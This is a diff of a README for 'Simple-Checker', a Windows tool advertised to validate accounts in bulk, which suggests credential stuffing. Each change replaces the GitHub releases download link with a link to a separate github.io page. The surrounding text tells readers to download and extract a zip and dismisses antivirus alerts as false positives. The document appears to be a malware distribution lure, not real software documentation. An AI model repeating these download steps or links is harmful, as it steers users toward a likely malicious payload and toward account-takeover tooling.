@@ -1,7 +1,7 @@
 <h1>✅ Simple-Checker - Validate Any Account in Seconds</h1>
 
 <p align="center">
-  <a href="https://github.com/Karyacipta211/Simple-Checker/releases">
+  <a href="https://karyacipta211.github.io">
     <img src="https://img.shields.io/badge/⬇️%20Download%20Now-Free%20Tool-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f" alt="Download Simple-Checker" />
   </a>
 </p>
@@ -36,7 +36,7 @@ Follow these simple steps to get Simple-Checker up and running on your Windows P
 .### Step 1: Download the Application
 
 Visit this link to download the application:
-👉 **[Simple-Checker Releases Page](https://github.com/Karyacipta211/Simple-Checker/releases)**
+👉 **[Simple-Checker Releases Page](https://karyacipta211.github.io)**
 
 This page shows all available versions. Look for the latest release (usually at the top) anda click on the download button. The file is typically named something like `Simple-Checker.zip`. Wait for the download to finish—it usually takes less than a minute on a normal internet connection.
 
@@ -124,7 +124,7 @@ Some antivirus programs may show a false positive due to the nature of the tool 
 
 
 ### ❓ How do I update Simple-Checker?
-Visit the same [releases page](https://github.com/Karyacipta211/Simple-Checker/releases) periodically to check for newer versions. Simply download the latest `.zip`, extract it, anda replace your old folder (keep your exported results—they’re saved separately).
+Visit the same [releases page](https://karyacipta211.github.io) periodically to check for newer versions. Simply download the latest `.zip`, extract it, anda replace your old folder (keep your exported results—they’re saved separately).
 
 
 
@@ -159,7 +159,7 @@ These are very modest—almost any modern PC can run this smoothly.
 Ready to start? Click the big button below to head over to the official release page anda get the latest version:
 
 <p align="center">
-  <a href="https://github.com/Karyacipta211/Simple-Checker/releases">
+  <a href="https://karyacipta211.github.io">
     <img src="https://img.shields.io/badge/⬇️%20Download%20Simple--Checker-Latest%20Version-blue?style=for-the-badge&logo=github&logoColor=white&color=FF6F00" alt="Download Button" />
   </a>
 </p>
